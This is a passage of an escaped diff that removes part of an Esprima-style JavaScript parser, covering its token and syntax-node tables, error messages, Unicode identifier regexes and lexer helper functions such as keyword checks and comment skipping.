7<c><\n>-        StringLiteral: 8<c><\n>-        RegularExpression: 9<c><\n>-        Template: 10<\n>-    };<\n>-    TokenName = {};<\n>-    TokenName[Token.BooleanLiteral] = 'Boolean';<\n>-    TokenName[Token.EOF] = '<end>';<\n>-    TokenName[Token.Identifier] = 'Identifier';<\n>-    TokenName[Token.Keyword] = 'Keyword';<\n>-    TokenName[Token.NullLiteral] = 'Null';<\n>-    TokenName[Token.NumericLiteral] = 'Numeric';<\n>-    TokenName[Token.Punctuator] = 'Punctuator';<\n>-    TokenName[Token.StringLiteral] = 'String';<\n>-    TokenName[Token.RegularExpression] = 'RegularExpression';<\n>-    // A function following one of those tokens is an expression.<\n>-    FnExprTokens = ['('<c> '{'<c> '['<c> 'in'<c> 'typeof'<c> 'instanceof'<c> 'new'<c><\n>-                    'return'<c> 'case'<c> 'delete'<c> 'throw'<c> 'void'<c><\n>-                    // assignment operators<\n>-                    '='<c> '+='<c> '-='<c> '*='<c> '/='<c> '%='<c> '<<='<c> '>>='<c> '>>>='<c><\n>-                    '&='<c> '|='<c> '^='<c> '<c>'<c><\n>-                    // binary/unary operators<\n>-                    '+'<c> '-'<c> '*'<c> '/'<c> '%'<c> '++'<c> '--'<c> '<<'<c> '>>'<c> '>>>'<c> '&'<c><\n>-                    '|'<c> '^'<c> '!'<c> '~'<c> '&&'<c> '||'<c> '?'<c> ':'<c> '==='<c> '=='<c> '>='<c><\n>-                    '<='<c> '<'<c> '>'<c> '!='<c> '!=='];<\n>-    Syntax = {<\n>-        ArrayExpression: 'ArrayExpression'<c><\n>-        ArrayPattern: 'ArrayPattern'<c><\n>-        ArrowFunctionExpression: 'ArrowFunctionExpression'<c><\n>-        AssignmentExpression: 'AssignmentExpression'<c><\n>-        BinaryExpression: 'BinaryExpression'<c><\n>-        BlockStatement: 'BlockStatement'<c><\n>-        BreakStatement: 'BreakStatement'<c><\n>-        CallExpression: 'CallExpression'<c><\n>-        CatchClause: 'CatchClause'<c><\n>-        ClassBody: 'ClassBody'<c><\n>-        ClassDeclaration: 'ClassDeclaration'<c><\n>-        ClassExpression: 'ClassExpression'<c><\n>-        ComprehensionBlock: 'ComprehensionBlock'<c><\n>-        ComprehensionExpression: 'ComprehensionExpression'<c><\n>-        ConditionalExpression: 'ConditionalExpression'<c><\n>-        ContinueStatement: 'ContinueStatement'<c><\n>-        DebuggerStatement: 'DebuggerStatement'<c><\n>-        DoWhileStatement: 'DoWhileStatement'<c><\n>-        EmptyStatement: 'EmptyStatement'<c><\n>-        ExportDeclaration: 'ExportDeclaration'<c><\n>-        ExportBatchSpecifier: 'ExportBatchSpecifier'<c><\n>-        ExportSpecifier: 'ExportSpecifier'<c><\n>-        ExpressionStatement: 'ExpressionStatement'<c><\n>-        ForInStatement: 'ForInStatement'<c><\n>-        ForOfStatement: 'ForOfStatement'<c><\n>-        ForStatement: 'ForStatement'<c><\n>-        FunctionDeclaration: 'FunctionDeclaration'<c><\n>-        FunctionExpression: 'FunctionExpression'<c><\n>-        Identifier: 'Identifier'<c><\n>-        IfStatement: 'IfStatement'<c><\n>-        ImportDeclaration: 'ImportDeclaration'<c><\n>-        ImportDefaultSpecifier: 'ImportDefaultSpecifier'<c><\n>-        ImportNamespaceSpecifier: 'ImportNamespaceSpecifier'<c><\n>-        ImportSpecifier: 'ImportSpecifier'<c><\n>-        LabeledStatement: 'LabeledStatement'<c><\n>-        Literal: 'Literal'<c><\n>-        LogicalExpression: 'LogicalExpression'<c><\n>-        MemberExpression: 'MemberExpression'<c><\n>-        MethodDefinition: 'MethodDefinition'<c><\n>-        ModuleSpecifier: 'ModuleSpecifier'<c><\n>-        NewExpression: 'NewExpression'<c><\n>-        ObjectExpression: 'ObjectExpression'<c><\n>-        ObjectPattern: 'ObjectPattern'<c><\n>-        Program: 'Program'<c><\n>-        Property: 'Property'<c><\n>-        ReturnStatement: 'ReturnStatement'<c><\n>-        SequenceExpression: 'SequenceExpression'<c><\n>-        SpreadElement: 'SpreadElement'<c><\n>-        SwitchCase: 'SwitchCase'<c><\n>-        SwitchStatement: 'SwitchStatement'<c><\n>-        TaggedTemplateExpression: 'TaggedTemplateExpression'<c><\n>-        TemplateElement: 'TemplateElement'<c><\n>-        TemplateLiteral: 'TemplateLiteral'<c><\n>-        ThisExpression: 'ThisExpression'<c><\n>-        ThrowStatement: 'ThrowStatement'<c><\n>-        TryStatement: 'TryStatement'<c><\n>-        UnaryExpression: 'UnaryExpression'<c><\n>-        UpdateExpression: 'UpdateExpression'<c><\n>-        VariableDeclaration: 'VariableDeclaration'<c><\n>-        VariableDeclarator: 'VariableDeclarator'<c><\n>-        WhileStatement: 'WhileStatement'<c><\n>-        WithStatement: 'WithStatement'<c><\n>-        YieldExpression: 'YieldExpression'<\n>-    };<\n>-    PropertyKind = {<\n>-        Data: 1<c><\n>-        Get: 2<c><\n>-        Set: 4<\n>-    };<\n>-    ClassPropertyType = {<\n>-        'static': 'static'<c><\n>-        prototype: 'prototype'<\n>-    };<\n>-    // Error messages should be identical to V8.<\n>-    Messages = {<\n>-        UnexpectedToken:  'Unexpected token %0'<c><\n>-        UnexpectedNumber:  'Unexpected number'<c><\n>-        UnexpectedString:  'Unexpected string'<c><\n>-        UnexpectedIdentifier:  'Unexpected identifier'<c><\n>-        UnexpectedReserved:  'Unexpected reserved word'<c><\n>-        UnexpectedTemplate:  'Unexpected quasi %0'<c><\n>-        UnexpectedEOS:  'Unexpected end of input'<c><\n>-        NewlineAfterThrow:  'Illegal newline after throw'<c><\n>-        InvalidRegExp: 'Invalid regular expression'<c><\n>-        UnterminatedRegExp:  'Invalid regular expression: missing /'<c><\n>-        InvalidLHSInAssignment:  'Invalid left-hand side in assignment'<c><\n>-        InvalidLHSInFormalsList:  'Invalid left-hand side in formals list'<c><\n>-        InvalidLHSInForIn:  'Invalid left-hand side in for-in'<c><\n>-        MultipleDefaultsInSwitch: 'More than one default clause in switch statement'<c><\n>-        NoCatchOrFinally:  'Missing catch or finally after try'<c><\n>-        UnknownLabel: 'Undefined label \'%0\''<c><\n>-        Redeclaration: '%0 \'%1\' has already been declared'<c><\n>-        IllegalContinue: 'Illegal continue statement'<c><\n>-        IllegalBreak: 'Illegal break statement'<c><\n>-        IllegalDuplicateClassProperty: 'Illegal duplicate property in class definition'<c><\n>-        IllegalReturn: 'Illegal return statement'<c><\n>-        IllegalYield: 'Illegal yield expression'<c><\n>-        IllegalSpread: 'Illegal spread element'<c><\n>-        StrictModeWith:  'Strict mode code may not include a with statement'<c><\n>-        StrictCatchVariable:  'Catch variable may not be eval or arguments in strict mode'<c><\n>-        StrictVarName:  'Variable name may not be eval or arguments in strict mode'<c><\n>-        StrictParamName:  'Parameter name eval or arguments is not allowed in strict mode'<c><\n>-        StrictParamDupe: 'Strict mode function may not have duplicate parameter names'<c><\n>-        ParameterAfterRestParameter: 'Rest parameter must be final parameter of an argument list'<c><\n>-        DefaultRestParameter: 'Rest parameter can not have a default value'<c><\n>-        ElementAfterSpreadElement: 'Spread must be the final element of an element list'<c><\n>-        ObjectPatternAsRestParameter: 'Invalid rest parameter'<c><\n>-        ObjectPatternAsSpread: 'Invalid spread argument'<c><\n>-        StrictFunctionName:  'Function name may not be eval or arguments in strict mode'<c><\n>-        StrictOctalLiteral:  'Octal literals are not allowed in strict mode.'<c><\n>-        StrictDelete:  'Delete of an unqualified identifier in strict mode.'<c><\n>-        StrictDuplicateProperty:  'Duplicate data property in object literal not allowed in strict mode'<c><\n>-        AccessorDataProperty:  'Object literal may not have data and accessor property with the same name'<c><\n>-        AccessorGetSet:  'Object literal may not have multiple get/set accessors with the same name'<c><\n>-        StrictLHSAssignment:  'Assignment to eval or arguments is not allowed in strict mode'<c><\n>-        StrictLHSPostfix:  'Postfix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>-        StrictLHSPrefix:  'Prefix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>-        StrictReservedWord:  'Use of future reserved word in strict mode'<c><\n>-        MissingFromClause: 'Missing from clause'<c><\n>-        NoAsAfterImportNamespace: 'Missing as after import *'<c><\n>-        InvalidModuleSpecifier: 'Invalid module specifier'<c><\n>-        NoUnintializedConst: 'Const must be initialized'<c><\n>-        ComprehensionRequiresBlock: 'Comprehension must have at least one block'<c><\n>-        ComprehensionError:  'Comprehension Error'<c><\n>-        EachNotAllowed:  'Each is not supported'<\n>-    };<\n>-    // See also tools/generate-unicode-regex.py.<\n>-    Regex = {<\n>-        NonAsciiIdentifierStart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0\u08a2-\u08ac\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0977\u0979-\u097f\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d\u0c58\u0c59\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d60\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191c\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19c1-\u19c7\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005-\u3007\u3021-\u3029\u3031-\u3035\u3038-\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua697\ua6a0-\ua6ef\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa80-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<c><\n>-        NonAsciiIdentifierPart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0300-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u0483-\u0487\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u0591-\u05bd\u05bf\u05c1\u05c2\u05c4\u05c5\u05c7\u05d0-\u05ea\u05f0-\u05f2\u0610-\u061a\u0620-\u0669\u066e-\u06d3\u06d5-\u06dc\u06df-\u06e8\u06ea-\u06fc\u06ff\u0710-\u074a\u074d-\u07b1\u07c0-\u07f5\u07fa\u0800-\u082d\u0840-\u085b\u08a0\u08a2-\u08ac\u08e4-\u08fe\u0900-\u0963\u0966-\u096f\u0971-\u0977\u0979-\u097f\u0981-\u0983\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bc-\u09c4\u09c7\u09c8\u09cb-\u09ce\u09d7\u09dc\u09dd\u09df-\u09e3\u09e6-\u09f1\u0a01-\u0a03\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a3c\u0a3e-\u0a42\u0a47\u0a48\u0a4b-\u0a4d\u0a51\u0a59-\u0a5c\u0a5e\u0a66-\u0a75\u0a81-\u0a83\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abc-\u0ac5\u0ac7-\u0ac9\u0acb-\u0acd\u0ad0\u0ae0-\u0ae3\u0ae6-\u0aef\u0b01-\u0b03\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3c-\u0b44\u0b47\u0b48\u0b4b-\u0b4d\u0b56\u0b57\u0b5c\u0b5d\u0b5f-\u0b63\u0b66-\u0b6f\u0b71\u0b82\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bbe-\u0bc2\u0bc6-\u0bc8\u0bca-\u0bcd\u0bd0\u0bd7\u0be6-\u0bef\u0c01-\u0c03\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d-\u0c44\u0c46-\u0c48\u0c4a-\u0c4d\u0c55\u0c56\u0c58\u0c59\u0c60-\u0c63\u0c66-\u0c6f\u0c82\u0c83\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbc-\u0cc4\u0cc6-\u0cc8\u0cca-\u0ccd\u0cd5\u0cd6\u0cde\u0ce0-\u0ce3\u0ce6-\u0cef\u0cf1\u0cf2\u0d02\u0d03\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d-\u0d44\u0d46-\u0d48\u0d4a-\u0d4e\u0d57\u0d60-\u0d63\u0d66-\u0d6f\u0d7a-\u0d7f\u0d82\u0d83\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0dca\u0dcf-\u0dd4\u0dd6\u0dd8-\u0ddf\u0df2\u0df3\u0e01-\u0e3a\u0e40-\u0e4e\u0e50-\u0e59\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb9\u0ebb-\u0ebd\u0ec0-\u0ec4\u0ec6\u0ec8-\u0ecd\u0ed0-\u0ed9\u0edc-\u0edf\u0f00\u0f18\u0f19\u0f20-\u0f29\u0f35\u0f37\u0f39\u0f3e-\u0f47\u0f49-\u0f6c\u0f71-\u0f84\u0f86-\u0f97\u0f99-\u0fbc\u0fc6\u1000-\u1049\u1050-\u109d\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u135d-\u135f\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1714\u1720-\u1734\u1740-\u1753\u1760-\u176c\u176e-\u1770\u1772\u1773\u1780-\u17d3\u17d7\u17dc\u17dd\u17e0-\u17e9\u180b-\u180d\u1810-\u1819\u1820-\u1877\u1880-\u18aa\u18b0-\u18f5\u1900-\u191c\u1920-\u192b\u1930-\u193b\u1946-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u19d0-\u19d9\u1a00-\u1a1b\u1a20-\u1a5e\u1a60-\u1a7c\u1a7f-\u1a89\u1a90-\u1a99\u1aa7\u1b00-\u1b4b\u1b50-\u1b59\u1b6b-\u1b73\u1b80-\u1bf3\u1c00-\u1c37\u1c40-\u1c49\u1c4d-\u1c7d\u1cd0-\u1cd2\u1cd4-\u1cf6\u1d00-\u1de6\u1dfc-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u200c\u200d\u203f\u2040\u2054\u2071\u207f\u2090-\u209c\u20d0-\u20dc\u20e1\u20e5-\u20f0\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d7f-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2de0-\u2dff\u2e2f\u3005-\u3007\u3021-\u302f\u3031-\u3035\u3038-\u303c\u3041-\u3096\u3099\u309a\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua62b\ua640-\ua66f\ua674-\ua67d\ua67f-\ua697\ua69f-\ua6f1\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua827\ua840-\ua873\ua880-\ua8c4\ua8d0-\ua8d9\ua8e0-\ua8f7\ua8fb\ua900-\ua92d\ua930-\ua953\ua960-\ua97c\ua980-\ua9c0\ua9cf-\ua9d9\uaa00-\uaa36\uaa40-\uaa4d\uaa50-\uaa59\uaa60-\uaa76\uaa7a\uaa7b\uaa80-\uaac2\uaadb-\uaadd\uaae0-\uaaef\uaaf2-\uaaf6\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabea\uabec\uabed\uabf0-\uabf9\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe00-\ufe0f\ufe20-\ufe26\ufe33\ufe34\ufe4d-\ufe4f\ufe70-\ufe74\ufe76-\ufefc\uff10-\uff19\uff21-\uff3a\uff3f\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<\n>-    };<\n>-    // Ensure the condition is true<c> otherwise throw an error.<\n>-    // This is only to have a better contract semantic<c> i.e. another safety net<\n>-    // to catch a logic error. The condition shall be fulfilled in normal case.<\n>-    // Do NOT use this to enforce a certain condition on any user input.<\n>-    function assert(condition<c> message) {<\n>-        /* istanbul ignore if */<\n>-        if (!condition) {<\n>-            throw new Error('ASSERT: ' + message);<\n>-        }<\n>-    }<\n>-    function StringMap() {<\n>-        this.$data = {};<\n>-    }<\n>-    StringMap.prototype.get = function (key) {<\n>-        key = '$' + key;<\n>-        return this.$data[key];<\n>-    };<\n>-    StringMap.prototype.set = function (key<c> value) {<\n>-        key = '$' + key;<\n>-        this.$data[key] = value;<\n>-        return this;<\n>-    };<\n>-    StringMap.prototype.has = function (key) {<\n>-        key = '$' + key;<\n>-        return Object.prototype.hasOwnProperty.call(this.$data<c> key);<\n>-    };<\n>-    StringMap.prototype['delete'] = function (key) {<\n>-        key = '$' + key;<\n>-        return delete this.$data[key];<\n>-    };<\n>-    function isDecimalDigit(ch) {<\n>-        return (ch >= 48 && ch <= 57);   // 0..9<\n>-    }<\n>-    function isHexDigit(ch) {<\n>-        return '0123456789abcdefABCDEF'.indexOf(ch) >= 0;<\n>-    }<\n>-    function isOctalDigit(ch) {<\n>-        return '01234567'.indexOf(ch) >= 0;<\n>-    }<\n>-    // 7.2 White Space<\n>-    function isWhiteSpace(ch) {<\n>-        return (ch === 32) ||  // space<\n>-            (ch === 9) ||      // tab<\n>-            (ch === 0xB) ||<\n>-            (ch === 0xC) ||<\n>-            (ch === 0xA0) ||<\n>-            (ch >= 0x1680 && '\u1680\u180E\u2000\u2001\u2002\u2003\u2004\u2005\u2006\u2007\u2008\u2009\u200A\u202F\u205F\u3000\uFEFF'.indexOf(String.fromCharCode(ch)) > 0);<\n>-    }<\n>-    // 7.3 Line Terminators<\n>-    function isLineTerminator(ch) {<\n>-        return (ch === 10) || (ch === 13) || (ch === 0x2028) || (ch === 0x2029);<\n>-    }<\n>-    // 7.6 Identifier Names and Identifiers<\n>-    function isIdentifierStart(ch) {<\n>-        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>-            (ch >= 65 && ch <= 90) ||         // A..Z<\n>-            (ch >= 97 && ch <= 122) ||        // a..z<\n>-            (ch === 92) ||                    // \ (backslash)<\n>-            ((ch >= 0x80) && Regex.NonAsciiIdentifierStart.test(String.fromCharCode(ch)));<\n>-    }<\n>-    function isIdentifierPart(ch) {<\n>-        return (ch === 36) || (ch === 95) ||  // $ (dollar) and _ (underscore)<\n>-            (ch >= 65 && ch <= 90) ||         // A..Z<\n>-            (ch >= 97 && ch <= 122) ||        // a..z<\n>-            (ch >= 48 && ch <= 57) ||         // 0..9<\n>-            (ch === 92) ||                    // \ (backslash)<\n>-            ((ch >= 0x80) && Regex.NonAsciiIdentifierPart.test(String.fromCharCode(ch)));<\n>-    }<\n>-    // 7.6.1.2 Future Reserved Words<\n>-    function isFutureReservedWord(id) {<\n>-        switch (id) {<\n>-        case 'class':<\n>-        case 'enum':<\n>-        case 'export':<\n>-        case 'extends':<\n>-        case 'import':<\n>-        case 'super':<\n>-            return true;<\n>-        default:<\n>-            return false;<\n>-        }<\n>-    }<\n>-    function isStrictModeReservedWord(id) {<\n>-        switch (id) {<\n>-        case 'implements':<\n>-        case 'interface':<\n>-        case 'package':<\n>-        case 'private':<\n>-        case 'protected':<\n>-        case 'public':<\n>-        case 'static':<\n>-        case 'yield':<\n>-        case 'let':<\n>-            return true;<\n>-        default:<\n>-            return false;<\n>-        }<\n>-    }<\n>-    function isRestrictedWord(id) {<\n>-        return id === 'eval' || id === 'arguments';<\n>-    }<\n>-    // 7.6.1.1 Keywords<\n>-    function isKeyword(id) {<\n>-        if (strict && isStrictModeReservedWord(id)) {<\n>-            return true;<\n>-        }<\n>-        // 'const' is specialized as Keyword in V8.<\n>-        // 'yield' is only treated as a keyword in strict mode.<\n>-        // 'let' is for compatiblity with SpiderMonkey and ES.next.<\n>-        // Some others are from future reserved words.<\n>-        switch (id.length) {<\n>-        case 2:<\n>-            return (id === 'if') || (id === 'in') || (id === 'do');<\n>-        case 3:<\n>-            return (id === 'var') || (id === 'for') || (id === 'new') ||<\n>-                (id === 'try') || (id === 'let');<\n>-        case 4:<\n>-            return (id === 'this') || (id === 'else') || (id === 'case') ||<\n>-                (id === 'void') || (id === 'with') || (id === 'enum');<\n>-        case 5:<\n>-            return (id === 'while') || (id === 'break') || (id === 'catch') ||<\n>-                (id === 'throw') || (id === 'const') ||<\n>-                (id === 'class') || (id === 'super');<\n>-        case 6:<\n>-            return (id === 'return') || (id === 'typeof') || (id === 'delete') ||<\n>-                (id === 'switch') || (id === 'export') || (id === 'import');<\n>-        case 7:<\n>-            return (id === 'default') || (id === 'finally') || (id === 'extends');<\n>-        case 8:<\n>-            return (id === 'function') || (id === 'continue') || (id === 'debugger');<\n>-        case 10:<\n>-            return (id === 'instanceof');<\n>-        default:<\n>-            return false;<\n>-        }<\n>-    }<\n>-    // 7.4 Comments<\n>-    function skipComment() {<\n>-        var ch<c> blockComment<c> lineComment;<\n>-        blockComment = false;<\n>-        lineComment = false;<\n>-        while (index < length) {<\n>-            ch = source.charCodeAt(index);<\n>-            if (lineComment) {<\n>-                ++index;<\n>-                if (isLineTerminator(ch)) {<\n>-                    lineComment = false;<\n>-                    if (ch === 13 && source.charCodeAt(index) === 10) {<\n>-                        ++index;<\n>-                    }<\n>-                    ++lineNumber;<\n>-                    lineStart = index;<\n>-                }<\n>-            } else if (blockComment) {<\n>-                if (isLineTerminator(ch)) {<\n>-                    if (ch === 13 && source.charCodeAt(index + 1) === 10) {<\n>-                        ++index;<\n>-                    }<\n>-                    